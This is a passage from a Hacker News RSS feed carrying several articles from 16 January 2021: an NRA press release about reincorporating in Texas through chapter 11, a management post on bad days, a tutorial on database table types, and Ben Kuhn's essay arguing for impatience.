<p><a target="_blank" href="https://twitter.com/LuciferCReeves?ref_src=twsrc%5Etfw"><img src="https://img.shields.io/twitter/follow/LuciferCReeves?label=Follow%20Me%20on%20Twitter&amp;logo=twitter&amp;style=for-the-badge&amp;labelColor=00acee&amp;logoColor=fff" alt="Twitter Follow"></a> <a target="_blank" href="https://github.com/luciferreeves"><img src="https://img.shields.io/github/followers/luciferreeves?label=Follow%20me%20on%20github&amp;logo=github&amp;style=for-the-badge" alt="GitHub followers"></a></p>
</div></div></section></div></div>]]>
            </description>
            <link>https://thatcomputerscientist.com/big-o-notation-explained-as-easily-as-possible</link>
            <guid isPermaLink="false">hacker-news-small-sites-25803288</guid>
            <pubDate>Sat, 16 Jan 2021 16:33:42 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[NRA Dumps New York to Reincorporate in Texas]]>
            </title>
            <description>
<![CDATA[
Score 8 | Comments 5 (<a href="https://news.ycombinator.com/item?id=25803248">thread link</a>) | @Tomte
<br/>
January 16, 2021 | https://www.nraforward.org/press-release | <a href="https://web.archive.org/web/*/https://www.nraforward.org/press-release">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div data-block-type="2" id="block-70a48e6cb3dd9bc957fa"><div><p>FOR IMMEDIATE RELEASE</p><p>Jan. 15, 2021</p><h3><strong>NRA Leaves New York to Reincorporate in Texas, Announces New Strategic Plan</strong></h3><h4><em>NRA Plans to Exit New York to Pursue Opportunity, Growth and Progress in Texas; Plan Benefits Association, Its Millions of Members, and All Supporters of the Second Amendment</em></h4><p>Fairfax, VA ‚Äì The National Rifle Association of America (‚ÄúNRA‚Äù) today announced it will restructure the Association as a Texas nonprofit to exit what it believes is a corrupt political and regulatory environment in New York. The move will enable long-term, sustainable growth and ensure the NRA‚Äôs continued success as the nation‚Äôs leading advocate for constitutional freedom ‚Äì free from the toxic political environment of New York. </p><p>The NRA plan, which involves utilizing the protection of the bankruptcy court, has the Association dumping New York and organizing its legal and regulatory matters in an efficient forum. The move comes at a time when the NRA is in its strongest financial condition in years.</p><p>The NRA will continue with the forward advancement of the enterprise ‚Äì confronting anti-Second Amendment activities, promoting firearm safety and training, and advancing public programs across the United States. There will be no immediate changes to the NRA‚Äôs operations or workforce.&nbsp;&nbsp;</p><p>The Association will seek court approval to reincorporate the Association in the State of Texas ‚Äì home to more than 400,000 NRA members and site of the 2021 NRA Annual Meeting in Houston. </p><p>‚ÄúThis strategic plan represents a pathway to opportunity, growth and progress,‚Äù says NRA CEO &amp; EVP Wayne LaPierre. ‚ÄúObviously, an important part of this plan is ‚Äòdumping New York.‚Äô The NRA is pursuing reincorporating in a state that values the contributions of the NRA, celebrates our law-abiding members, and will join us as a partner in upholding constitutional freedom. This is a transformational moment in the history of the NRA.‚Äù</p><p>The restructuring plan aims to streamline costs and expenses, proceed with pending litigation in a coordinated and structured manner, and realize many financial and strategic advantages.</p><p><span><strong>The Path Forward</strong></span></p><p>The NRA will move quickly through the restructuring process. Its day-to-day operations, training programs, and Second Amendment advocacy will continue as usual.</p><p>By exiting New York, where the NRA has been incorporated for approximately 150 years, the NRA abandons a state where elected officials have weaponized the legal and regulatory powers they wield to penalize the Association and its members for purely political purposes.</p><p>In the summer of 2018, then New York Attorney General candidate Letitia James vowed that, if elected, she would use the powers of her office to investigate the ‚Äúlegitimacy‚Äù of the NRA. </p><p>Without a shred of evidence to support the claim, she called the Association a ‚Äúterrorist organization‚Äù and a ‚Äúcriminal enterprise.‚Äù As promised, she commenced an ‚Äúinvestigation‚Äù upon being elected to the Office of NYAG and, predictably, filed a lawsuit seeking to dissolve the NRA just prior to the November 2020 national election.</p><p>The NRA filed a lawsuit in August 2020 against the NYAG similar to its lawsuit against New York Governor Andrew Cuomo and the New York State Department of Financial Services, filed in 2018. The NRA pursues the defendants for attempting to ‚Äúblacklist‚Äù the organization and its financial partners in violation of their First Amendment rights. The NRA will continue those legal actions. &nbsp;</p><p>‚ÄúUnder this plan, the Association wisely seeks protection from New York officials who it believes have illegally weaponized their powers against the NRA and its members,‚Äù says William A. Brewer III, counsel to the NRA in those cases. ‚ÄúThe NRA will continue the fight to protect the interests of its members in New York ‚Äì and all forums where the NRA is unlawfully singled out for its Second Amendment advocacy.‚Äù</p><p>With respect to its headquarters, the NRA has formed a committee to study opportunities for relocating segments of its business operations to Texas or other states. The Association&nbsp;will analyze whether a move of its headquarters, now located in Fairfax, Virginia, is in the best interests of its members. In the meantime, the NRA‚Äôs general business operations will remain in Fairfax.</p><p>To facilitate its strategic plan and restructuring, the NRA and one of its subsidiaries filed voluntary chapter 11 petitions in the United States Bankruptcy Court for the Northern District of Texas, Dallas Division. Chapter 11 proceedings are routinely utilized by businesses, nonprofits and organizations of all kinds to streamline legal and financial affairs. &nbsp;</p><p>The NRA also announced Marschall Smith will serve as Chief Restructuring Officer. A former Senior Vice President and General Counsel of 3M Company, Smith has more than 35 years of legal and business experience with an emphasis on compliance, corporate finance, and corporate governance.</p><p>‚ÄúI am honored to join the nation‚Äôs oldest and largest civil rights organization during this important time,‚Äù Smith says. ‚ÄúOur goal is to work through the restructuring process efficiently and quickly ‚Äì even as NRA leadership approaches 2021 with renewed energy and an expanding national platform. This plan has no impact on the NRA‚Äôs most important goal:&nbsp; serving its membership and protecting the Second Amendment.‚Äù</p><p>The NRA will propose a plan that provides for payment in full of all valid creditors‚Äô claims. The Association expects to uphold commitments to employees, vendors, members, and other community stakeholders.</p><p>‚ÄúThe plan allows us to protect the NRA and go forward with a renewed focus on Second Amendment advocacy,‚Äù says NRA President Carolyn Meadows. ‚ÄúWe will continue to honor the trust placed in us by employees, members and other stakeholders ‚Äì following a blueprint that allows us to become the strongest NRA ever known.‚Äù </p><p><strong>Additional Information:</strong></p><p>Patrick J. Neligan of Neligan LLP, Dallas, Texas, is serving as debtor‚Äôs counsel; William (Wit) Davis is counsel to the NRA Board of Directors and its Special Litigation Committee; Brewer, Attorneys &amp; Counselors, Dallas, Texas, serves as special counsel to the NRA. To learn more, please visit <a href="https://www.nra.org/forward">www.nra.org/forward</a>.</p><p><strong>About the NRA:</strong></p><p>Established in 1871, the National Rifle Association is America‚Äôs largest and oldest civil rights organization. Approximately five million members strong, NRA continues its mission to uphold Second Amendment rights and is the leader in firearm education and training for law-abiding gun owners, law enforcement and the military. The NRA‚Äôs 2021 Annual Meetings and Exhibits will be held September 3 ‚Äì 5, 2021 at the George R. Brown Convention Center in Houston, Texas. Follow the NRA on&nbsp;<a href="https://facebook.com/nationalrifleassociation" target="_blank">Facebook</a>,&nbsp;<a href="https://instagram.com/nra" target="_blank">Instagram</a>, and&nbsp;<a href="https://twitter.com/nra" target="_blank">Twitter</a>.</p><p><em>For more information contact:</em></p><p>Andrew Arulanandam, Managing Director, NRA Public Affairs, <a href="tel:+17039437152">(703) 943 7152</a>, <a href="mailto:aarulanandam@nrahq.org">aarulanandam@nrahq.org</a></p><p>Travis J. Carter, on behalf of Brewer, Attorneys &amp; Counselors and the NRA, <a href="tel:+12146534856">(214) 653 4856</a>, <a href="mailto:tcarter@brewerattorneys.com">tcarter@brewerattorneys.com</a></p></div></div></div>]]>
            </description>
            <link>https://www.nraforward.org/press-release</link>
            <guid isPermaLink="false">hacker-news-small-sites-25803248</guid>
            <pubDate>Sat, 16 Jan 2021 16:28:03 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Have Bad Days and Let Others Have Them Too]]>
            </title>
            <description>
<![CDATA[
Score 4 | Comments 0 (<a href="https://news.ycombinator.com/item?id=25802898">thread link</a>) | @meatandcheese
<br/>
January 16, 2021 | https://staysaasy.com/management/2021/01/16/Bad-Days.html | <a href="https://web.archive.org/web/*/https://staysaasy.com/management/2021/01/16/Bad-Days.html">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
    <p>Bad days happen. We all get tired, frustrated, annoyed, perturbed.  However, operating poorly on those days can have a major and lasting impact, turning bad days into worse days.</p>

<p>There are two good strategies for dealing with your bad day: reschedule or acknowledge.</p>

<h2 id="reschedule">Reschedule</h2>
<p>If the magnitude of badness is bad enough or if the stakes of the commitment are high enough, you should reschedule. There are very, very few things that you can‚Äôt actually reschedule, and trying to power-through important things on a terrible day often compounds problems.</p>

<p>A common example is when you‚Äôre scheduled to give a performance assessment. Managers often underestimate how high the stakes are for that meeting - say the wrong thing or seem unenthused or not have an ambitious path forward for your report and the impact can be a lasting negative impression. Furthermore, managers are often loath to reschedule performance assessments - your HR department has deadlines you have to hit, your report is anxiously waiting to have the review. However, if you‚Äôre having a very bad day, you should reschedule that meeting. Better to wait a couple days than to perform poorly in a high stakes meeting.</p>

<p>Your intuition will say that because a commitment is very important you should follow through and keep it on schedule, even if you‚Äôre having a bad day. However, you should reschedule that commitment because it is very important, and you are having a bad day.</p>

<h2 id="acknowledge">Acknowledge</h2>
<p>For lower stakes commitments and less bad days, keep to your schedule, but you should acknowledge your situation. Your poker face isn‚Äôt as good as you think it might be, and if you‚Äôre in a leadership position people will read more into your demeanor. You know that you‚Äôre frustrated because you got into a fender bender on the way to work; your report just sees a frustrated manager in a 1:1 and isn‚Äôt sure if it‚Äôs their performance, company performance, or something else causing the issue. Generally people assume the worst.</p>

<p>So just say what‚Äôs going on:</p>
<ul>
  <li>‚ÄúBefore we start this 1:1 I wanted to let you know that I‚Äôm a bit tired because I didn‚Äôt sleep well last night, so just know it‚Äôs not lack of enthusiasm for anything we talk about‚Äù</li>
  <li>‚ÄúI‚Äôve had a bit of a rocky morning unrelated to anything at work, so I‚Äôll jump in and tie break if needed, but I‚Äôll mostly listen today if that‚Äôs alright‚Äù</li>
</ul>

<p>Some simple disclaimers can help mitigate a meaningful amount of concern, false perceptions, and worry.</p>

<h2 id="other-peoples-bad-days">Other People‚Äôs Bad Days</h2>
<p>Other people have bad days too. As a manager or a leader, there are two main things to avoid - punishment and solutioning.</p>

<p>On the punishment front, if someone has a bad day every once and awhile where they aren‚Äôt as enthusiastic or productive as normal, that‚Äôs the cost of the doing business, not means for a performance ding. If you ever find yourself saying things like ‚ÄúThe main focus for the next half is for you to get to 100% every day‚Äù, you‚Äôre setting everyone up for failure.</p>

<p>On the solutioning front, people often try to fix other people‚Äôs bad days. There‚Äôs nothing worse than being around someone who requires everyone around them to always be happy. Sometimes people are going to be sad, frustrated, mad, or tired. Let them be. Bad days are to be gotten through, not to be fixed. That doesn‚Äôt mean you can‚Äôt ask if everything is alright, but you shouldn‚Äôt insist that the problems be discussed or solved.</p>

<h2 id="summary">Summary</h2>
<p>Have bad days. Let others have bad days. Use simple strategies to avoid making bad days worse.</p>


    




  </div></div>]]>
            </description>
            <link>https://staysaasy.com/management/2021/01/16/Bad-Days.html</link>
            <guid isPermaLink="false">hacker-news-small-sites-25802898</guid>
            <pubDate>Sat, 16 Jan 2021 15:42:22 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Database Table Types]]>
            </title>
            <description>
<![CDATA[
Score 3 | Comments 0 (<a href="https://news.ycombinator.com/item?id=25802602">thread link</a>) | @discocrisco
<br/>
January 16, 2021 | http://mark.random-article.com/musings/db-tables.html | <a href="https://web.archive.org/web/*/http://mark.random-article.com/musings/db-tables.html">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page">



<p> The following is a listing of general categories of tables that you find
in databases. Emphasis is placed on the <i>roles</i> of each table type. Note
also that this category listing is simply my own paradigm based on my own
experiences. Other people will surely disagree with me (but I suspect their
disagreements would be mostly on the details). I present this info to help you
get a grasp on database design. Problem solving is easier when you can
<i>break down</i> the problem, and this listing is one approach to breaking
down database tables into different types.



</p><h2> Core Table </h2>

<p> <b>Definition:</b> This is a "main" table in your database. Without these,
there really wouldn't be any reason for the database to exist.

</p><p> <b>How to Identify:</b> You can identify the Core tables because they
contain the <i>most relationships</i> to other tables. They will frequently
have relationships to numerous Lookup and Detail tables. They also typically
contain more fields than any other table in the database (but not always).


</p><h3> Core Table Fields </h3>

<p> A Core table typically contains (at minimum) the following fields, using
certain naming conventions.

</p><ol>

	<li> A <b>primary key</b> that is an AutoNumber. Using an AutoNumber
	ensures that each record will have a unique ID. The name of this field
	will be the same name as the table, only singular plus the suffix "ID",
	i.e. for an "Employees" table, the primary key would be "EmployeeID".

	</li><li> A <b>text field</b> containing the <i>most important information</i>
	in the table. This field should be indexed because the table will be
	sorted by this field (i.e. alphabetically). Additionally, this field will
	be searched / querried on frequently. The name of this field will probably
	be the same name as the table, only singular, i.e. if the table was named
	"Employees", this field would be called "Employee". Note: It is not
	unheard of for this field to be split up, i.e. in an "Employees" table,
	you might have "FirstName", "LastName" instead of just "Employee".

	</li><li> Other fields as necessary, with some conditions. (Read on.)

</li></ol>



<h2> Lookup Table </h2>

<p> <b>Definition:</b> A Lookup table is a "reference" table that contains
categories, types, keywords, tags, or other "classification" labels.
Typically these categories represent some kind of finite scale. Examples
include: priority, severity, frequency, quality, etc. 

</p><p> <b>How to Identify:</b> A Lookup table typically has a single relationship
to a Core table or Detail table and usually contains only 2 or 3 fields. Due
to their nature, they are <i>not</i> sorted alphabetically.

</p><p> <b>Warning on Naming Lookup Tables:</b> Having already described Lookup
tables as containing types, categories, or tags, I strongly discourage you
from using the words "class", "type", "category" or similar to name the table.
Why, you ask? Simple answer: What does the word "type" mean? If I have two
Lookup tables that both list "types" of a Core table record, how exactly do I
distinguish between those two "types"? Here's a guideline to follow: if you
are about to use the word "type" in a Lookup table name, ask yourself "What
'type' of thing is this?" The answer to that question is the name you should
use instead. 


</p><h3> Lookup Table Fields </h3>

<p> A Lookup table typically contains the following fields, using the same
naming conventions as Core tables.

</p><ol>

	<li> A <b>primary key</b> that is a Long Integer (<u>not</u> an
	AutoNumber). The talbe will be sorted by this field such that the
	priorities / severities / frequencies all sort logically from "highest" to
	"lowest". The name will be "Table (singular) + ID". Note: A
	forward-thinking database designer will not number the records
	sequentially (1,2,3,4...) but rather by 10s or 100s, so as to allow easy
	addition of records later on.

	</li><li> A <b>text field</b> containing the category name. Name is "Table
	(singular)".

	</li><li> (Optional) Another, longer <b>text field</b> (or memo field)
	containing a description of this category.

</li></ol>


<h3> More on Adding Core Table Fields </h3>

<p> When you add a new text field to a Core table, ask yourself: "Does this
field represent a 'type' or 'class'?" If so, you should not add a text field,
you should add a Lookup table instead.

</p><p> In order to make your Lookup table work with your Core table, you need to
be able to create a relationship between them. Thus, we need to add another
field to the Core table: a <b>foriegn key</b>. This field should be a Long
Integer to match the type of the primary key in the Lookup tables. They should
have the same name as the primary key field name of the Lookup table.

</p><p> <b>Why do we create relationships based on numbers instead of text?</b>
Valid question. Here's why:

</p><ul>

	<li> Integers consume <i>less space</i> than text fields.

	</li><li> Integers <i>sort faster</i> than text.

	</li><li> It is easier to make typos with text than with integers. Such typos
	can quickly render querries useless.

	</li><li> The VB ADO controls have a very easy method for managing these kind
	of relationships.

</li></ul>



<h2> List Table </h2>

<p> <b>Definition:</b> This is another kind of "reference" table, similar to a
Lookup table, but it contains a longer listing of records and new records will
frequently be added. (Hence "List".) Examples include: Vendors, Shippers,
Suppliers, Reasons, Purposes, Genres, etc. You could think of it as a
"Growable Lookup" table.

</p><p> <b>How to Identify:</b> A List table typically has a single relationship
to a Core table or Detail table but often contains numerous fields. These
typically <i>are</i> be sorted alphabetically. List tables might even have
Lookup and Detail tables related to them!  

</p><p> <b>Warning on Naming:</b> The same warning given earlier regarding naming
Lookup tables applies to List tables as well.


</p><h3> List Table Fields </h3>

<ol>

	<li> A <b>primary key</b> that is an AutoNumber. An AutoNumber is used so
	as to easily allow the addition of new entries.  The name will be "Table
	(singular) + ID".

	</li><li> A <b>text field</b> containing the category name. This field will be
	indexed so it can be quickly sorted and querried on. Name is "Table
	(singular)".

	</li><li> Other fields as needed, following the same rules as Core tables. In
	other words, don't add new fields if you should be adding new Lookup /
	List / Detail tables instead.

</li></ol>

<p> <b>More on Adding Core Table Fields:</b> The same counsel given above on
adding a "type" field to a Core table applies here: don't add a text field
when you should be adding a  List table instead. To make List tables work, you
need to be able to create a relationship between Core and Lookup tables.
Thus, we need to add another foreign key field to the Core table, just as we
did for Lookup tables.

</p><p> <b>Note:</b> Because List tables have the  potential to grow into whole
entities of their own, some people prefer to implement them as Core tables
from the start. It's only a naming difference after all, and a rose is a rose.



</p><h2> Detail Table </h2>

<p> <b>Definition:</b> A Detail table contains specific items that are
subordinate to the records in a Core table. Examples include: Order Details,
Event Logs, Incident Reports, User Comments, and so forth.

</p><p> <b>How to Identify:</b> A Detail table typically has a single relationship
to a Core table, hence it contains a field that is a foreign key to a Core
table. It also typically has a 2-part name, the first part being the same as
the Core table to which it is related. For example, if there is a table called
"Orders", it might have a Detail table called "OrderItems". It is not unheard
of to have a Detail table with Lookup / List fields related to it. Sometimes
Detail tables will contain further Detail tables, but this is rare.


</p><h3> Detail Table Fields </h3>

<ol>

	<li> A <b>primary key</b> that is an AutoNumber. An AutoNumber is used so
	as to easily allow the addition of new detail records.  The name will be
	"Table (singular) + ID".

	</li><li> A <b>foreign key</b> that is a Long Integer. This will reference the
	primary key in a Core table and should have the same name.

	</li><li> Other fields as needed, following the same rules as Core tables. In
	other words, don't add new fields if you should be adding new Lookup /
	List / Detail tables instead.

</li></ol>


<h3> More On Adding Core Table Fields </h3>

<p> Happily, you do not need to add any additional fields to your Core table
to create a relationship to a Detail table. This is because <i>the Detail
records are responsible for maintaining the relationship</i> not the Core
table.

</p><p> That having been said, I have some additional counsel for designing your
Core tables: Add additional fields as needed to your Core tables but only if
you can <i>guarantee</i> that a given record will never require more than one
instance of that field. If you can imagine a case where more than one instance
will be required, make a Detail table instead. You can tell you've made a
mistake, if, for example, in a "Contacts" table you have fields that read
"PhoneNumber", "PhoneNumber1", "PhoneNumber2", etc.



</p><h2> Cross-Reference Table </h2>

<p> <b>Definition:</b> A Cross-Reference table exists only to create a
many-to-many relationship between two other tables. Typically, these two other
tables will be Core tables, but that is not a requirement.

</p><p> <b>How to Identify:</b> You can identify Cross-Reference tables because
they typically contain only 2 fields: 2 foreign keys that reference primary
keys in Core tables. A <i>compound primary key</i> will be made out of these
two foreign keys, so as to disallow duplicate entries of the same two foreign
keys.


</p><h3> Cross-Reference Table Fields </h3>

<ol>

	<li> A <b>foreign key</b> to one table. It will have the same name as the
	primary key in the table it references.

	</li><li> A <b>foreign key</b> to another table. It will have the same name as
	the primary key in the table it references.

	</li><li> Optionally, an additional text / memo field that describes this
	entry. These are rare, though.

</li></ol>


<h3> More on Adding Core Table Fields </h3>

<p> When you add a new foreign key to a Core table that will reference a
Lookup / List table, ask yourself if there is a chance that two of the
categories in that Lookup / List table could describe the Core table record,
you should be adding a Cross-Reference table instead. For example: if I was
making a "Movies" table, and I was about to add a foreign key to reference a
"Genres" List table, I should ask myself: "Is it possible that a movie ‚Ä¶</p></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="http://mark.random-article.com/musings/db-tables.html">http://mark.random-article.com/musings/db-tables.html</a></em></p>]]>
            </description>
            <link>http://mark.random-article.com/musings/db-tables.html</link>
            <guid isPermaLink="false">hacker-news-small-sites-25802602</guid>
            <pubDate>Sat, 16 Jan 2021 15:02:53 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Be Impatient]]>
            </title>
            <description>
<![CDATA[
Score 3 | Comments 0 (<a href="https://news.ycombinator.com/item?id=25802572">thread link</a>) | @etherio
<br/>
January 16, 2021 | https://www.benkuhn.net/impatient/ | <a href="https://web.archive.org/web/*/https://www.benkuhn.net/impatient/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><article><p>June, 2017: my partner Eve and I are stuck at the visa-on-arrival desk in the domestic transfer wing of Bole International Airport, Addis Ababa. The rest of the transfer passengers, all Ethiopian, are waltzing past us to form a monster queue at passport control. As soon as I get my precious stamp, I sprint off to hold our place before more passengers sneak in front of us.</p><p>Ten minutes later, Eve finds me, groggy from our redeye and nonplussed about navigating the Ethiopian visa desk on her own. ‚ÄúWhy did you have to run off like that?!‚Äù Somehow, ‚Äúso that we could wait at the departure gate instead of in the passport control line‚Äù doesn‚Äôt seem like a very good reason.</p><p>It was at this moment that I realized I was an unreasonably impatient person.</p><p>(In retrospect, I probably should have been tipped off by my compulsion of doing a mental <a href="https://en.wikipedia.org/wiki/Critical_path_method" target="_blank">critical path analysis</a> on any everyday activity taking more than 15 seconds, but I just thought that was normal until I started dating people and noticed they often did things in a sub-optimal order.)</p><hr><p>Now that I‚Äôve confessed to the sin of impatience, I‚Äôm going to spend the rest of this post trying to convince you that it‚Äôs actually a good thing.</p><p>(The good part is the habit of frequently asking yourself ‚Äúhow could this thing take less calendar time.‚Äù I don‚Äôt recommend manifesting it in annoying ways like ditching your partner in an Ethiopian airport.)</p><p>Being impatient is the best way to get faster at things. And across a surprising number of domains, being really fast correlates strongly with being effective.</p><p>Obviously, lots of these are non-causal correlations. Still, the sheer number of different datapoints is a surprising convergence:</p><h3 id="e-mail">E-mail</h3><p>It seems trivial, but lots of different people have observed that being slow to respond to emails is a bad sign, or that famous people whom you‚Äôd expect to be swamped respond surprisingly quickly.</p><p><a href="https://twitter.com/sriramk/status/1214278840358359040" target="_blank">Sriram Krishnan</a>:</p><blockquote><ul><li><p>the most famous, interesting, powerful people all read their own email</p></li><li><p>they‚Äôre almost universally good at responding to it quickly</p></li><li><p>they‚Äôre always very, very curious.</p></li><li><p>they have very little time. Anything with friction gets done ‚Äúlater‚Äù</p></li></ul></blockquote><p><a href="https://blog.samaltman.com/how-to-invest-in-startups" target="_blank">Sam Altman</a>:</p><blockquote><p>people tend to be either slow movers or fast movers and that seems harder to change. Being a fast mover is a big thing; a somewhat trivial example is that I have almost never made money investing in founders who do not respond quickly to important emails.</p></blockquote><h3 id="startups">Startups</h3><p>It‚Äôs become common wisdom that launching (and iterating) quickly is a major factor behind whether startups succeed.</p><p><a href="https://startupclass.samaltman.com/courses/lec02/" target="_blank">Sam Altman again</a>:</p><blockquote><p>[Y]ou have to be decisive. Indecisiveness is a startup killer. Mediocre founders spend a lot of time talking about grand plans, but they never make a decision. They‚Äôre talking about you know I could do this thing, or I could do that other thing, and they‚Äôre going back and forth and they never act. And what you actually need is this bias towards action.</p><p>The best founders work on things that seem small but they move really quickly. But they get things done really quickly. Every time you talk to the best founders they‚Äôve gotten new things done. In fact, this is the one thing that we learned best predicts a success of founders in YC. If every time we talk to a team they‚Äôve gotten new things done, that‚Äôs the best predictor we have that a company will be successful.</p></blockquote><p>This propagates even down to the level of how quickly you deploy software changes. <a href="https://twitter.com/schrockn/status/1130569945891258369" target="_blank">Nick Schrock</a> on Facebook / Instagram moving fast and breaking things:</p><blockquote><p>Instagram was even faster operationally than Facebook. They had continuous deployment. Any engineer could deploy at any time (they would run a command called ‚ÄúYolout‚Äù lol). Facebook was on weekly deploys at the time on the web and way slower on mobile.</p><p>IG story definitely lends credibility to the those-who-ship-faster-win argument</p><p>‚Ä¶Worth noting that Facebook learned from this. As the company grew, the release cadence got faster. First daily, then twice daily, and it is now continuous. It‚Äôs a remarkable achievement by the release engineering team.</p></blockquote><p>It‚Äôs not just Facebook; <a href="https://www.amazon.com/Accelerate-Software-Performing-Technology-Organizations-ebook/dp/B07B9F83WM/" target="_blank"><em>Accelerate</em> found a strong correlation between deploy frequency and performance</a>:</p><blockquote><p>To summarize, in 2017 we found that, when compared to low performers, the high performers have:</p><ul><li><p>46 times more frequent code deployments</p></li><li><p>440 times faster lead time from commit to deploy</p></li></ul></blockquote><h3 id="appstools">Apps/tools</h3><p>The ‚Äúspeed matters a lot‚Äù principle applies even to things that are already very fast. Google has found that <a href="https://developers.google.com/web/fundamentals/performance/why-performance-matters" target="_blank">users <em>dramatically</em> prefer faster webpages</a>:</p><blockquote><ul><li><p>The BBC found they lost an additional 10% of users for every additional second their site took to load.</p></li><li><p>DoubleClick by Google found 53% of mobile site visits were abandoned if a page took longer than 3 seconds to load.</p></li></ul><p>‚Ä¶</p><ul><li>When AutoAnything reduced page load time by half, they saw a boost of 12-13% in sales.</li></ul></blockquote><p><a href="https://jsomers.net/blog/speed-matters" target="_blank">James Somers</a>:</p><blockquote><p>Google famously prioritized speed as a feature. They realized that if search is fast, you‚Äôre more likely to search. The reason is that it encourages you to try stuff, get feedback, and try again. When a thought occurs to you, you know Google is already there. There is no delay between thought and action, no opportunity to lose the impulse to find something out. The projected cost of googling is nil. It comes to feel like an extension of your own mind.</p></blockquote><p><a href="https://blog.nelhage.com/post/reflections-on-performance/" target="_blank">Nelson Elhage put it best</a>:</p><blockquote><p>What is perhaps less apparent is that <em>having faster tools changes how users use a tool or perform a task.</em> Users almost always have multiple strategies available to pursue a goal ‚Äî including deciding to work on something else entirely ‚Äî and they will choose to use faster tools more and more frequently. Fast tools don‚Äôt just allow users to accomplish tasks faster; they allow users to accomplish entirely new types of tasks, in entirely new ways. I‚Äôve seen this phenomenon clearly while working on both Sorbet and Livegrep‚Ä¶</p><p>Many individual tests at Stripe would take 10-20s or more‚Ä¶. Because we succeeded at building Sorbet so that it could typecheck the entire codebase in that time window, it became the fastest way many developers could get decent feedback on their code, to check for basic typos, misused APIs, and other low-hanging classes of errors. Since it was their fastest option, we saw users reaching for Sorbet as their first line of checking their code fairly early on in our development and rollout. Getting even mediocre feedback and some confidence fast was much more important than anything that would take minutes.</p><p>Watching users use livegrep, I‚Äôve seen a related upside from its performance‚Ä¶. Because livegrep is so fast, users use it <em>interactively</em> in a way I‚Äôve rarely seen people interact with other search engines: they enter an initial query, and then, if they get too many or too few results, they edit it based on the result list, which gets a new set of results, which they continue to refine or expand until they hit on the results they are seeking.</p></blockquote><h3 id="personal-workflow">Personal workflow</h3><p><a href="https://blog.samaltman.com/productivity" target="_blank">Sam Altman</a>:</p><blockquote><p>I also made an effort to learn to type really fast and the keyboard shortcuts that help with my workflow.</p></blockquote><p><a href="https://blog.codinghorror.com/we-are-typists-first-programmers-second/" target="_blank">Steve Yegge via Jeff Atwood</a>:</p><blockquote><p>I was trying to figure out which is the most important computer science course a CS student could ever take, and eventually realized it‚Äôs Typing 101.</p><p>The really great engineers I know, the ones who build great things, they can type.</p></blockquote><p>This matches my experience at Wave, where the best engineers are disproportionately likely to type quickly, know their keyboard shortcuts, and have invested a lot of time making their common tasks efficient.</p><p>Obviously, those aren‚Äôt the main things that make them good engineers‚Äîbut I think they help in more than just the obvious ways.</p><h3 id="negotiations">Negotiations</h3><p>At Wave, when hiring, we‚Äôve noticed that moving someone through the hiring process faster makes them <em>much</em> more likely to accept our offer. If we take a long time to get back to them or schedule the next steps, it both gives them more time to lose interest, and makes it seem like we‚Äôre not excited about them. Not a good look!</p><p>This is apparently common trope in sales as well‚Äî<a href="https://www.fastcompany.com/1204077/time-kills-deals" target="_blank">‚Äútime kills all deals‚Äù</a>.</p><p>Paul Graham on <a href="http://paulgraham.com/ds.html" target="_blank">how the founders of Stripe got time on their side</a>:</p><blockquote><p>At YC we use the term ‚ÄúCollison installation‚Äù for the technique they invented. More diffident founders ask ‚ÄúWill you try our beta?‚Äù and if the answer is yes, they say ‚ÄúGreat, we‚Äôll send you a link.‚Äù But the Collison brothers weren‚Äôt going to wait. When anyone agreed to try Stripe they‚Äôd say ‚ÄúRight then, give me your laptop‚Äù and set them up on the spot.</p></blockquote><p><a href="https://avc.com/2018/08/strike-when-the-iron-is-hot/" target="_blank">Fred Wilson</a> on the same effect in networking:</p><blockquote><p>That night when I got home I told the Gotham Gal ‚ÄúI met Danny Meyer today and he gave me his card and said I could call him whenever I need a table.‚Äù To which she replied ‚Äúgo there for lunch tomorrow.‚Äù And I told her ‚ÄúI don‚Äôt have a lunch tomorrow.‚Äù She said ‚ÄúGet one. He will remember who you are tomorrow but won‚Äôt next month.‚Äù</p></blockquote><h3 id="combat">Combat</h3><p>One of the most influential military strategy writers, John Boyd, is most famous for the idea of the ‚ÄúOODA loop:‚Äù that human action is an iterated process of <em>observing</em> the world, <em>orienting</em> within it, <em>deciding</em> how to respond and finally <em>acting</em> on the decision. Boyd‚Äôs claim was that <em>going through the OODA loop faster was a decisive advantage</em>:</p><blockquote><p>In order to win, we should operate at a faster tempo or rhythm than our adversaries‚Äîor, better yet, get inside [the] adversary‚Äôs Observation-Orientation-Decision-Action time cycle or loop ‚Ä¶ Such activity will make us appear ambiguous (unpredictable) thereby generate confusion and disorder among our adversaries‚Äîsince our adversaries will be unable to generate mental images or pictures that agree with the menacing, as well as faster transient rhythm or patterns, they are competing against.</p></blockquote><p>As a recent example, for instance, many states and countries <a href="https://www.benkuhn.net/macovid/">waited far too long</a> to lock down when the COVID epidemic hit because <a href="https://www.ribbonfarm.com/2020/03/09/plot-economics/" target="_blank">the virus got inside their OODA loop</a>:</p><blockquote><p>Right now, the perception of agency at all levels is falling. Individuals, corporations, governments, heads of state, stock traders, the UN, <em>everybody</em> feels they‚Äôre losing the plot, but they don‚Äôt see anybody else <em>finding</em> it‚Ä¶. As far ‚Ä¶</p></blockquote></article></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://www.benkuhn.net/impatient/">https://www.benkuhn.net/impatient/</a></em></p>]]>
            </description>
            <link>https://www.benkuhn.net/impatient/</link>
            <guid isPermaLink="false">hacker-news-small-sites-25802572</guid>
            <pubDate>Sat, 16 Jan 2021 14:58:45 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[.NET for Beginners]]>
            </title>
            <description>
<![CDATA[
Score 3 | Comments 2 (<a href="https://news.ycombinator.com/item?id=25802480">thread link</a>) | @dustinmoris
<br/>
January 16, 2021 | https://dusted.codes/dotnet-for-beginners | <a href="https://web.archive.org/web/*/https://dusted.codes/dotnet-for-beginners">archive.org</a>
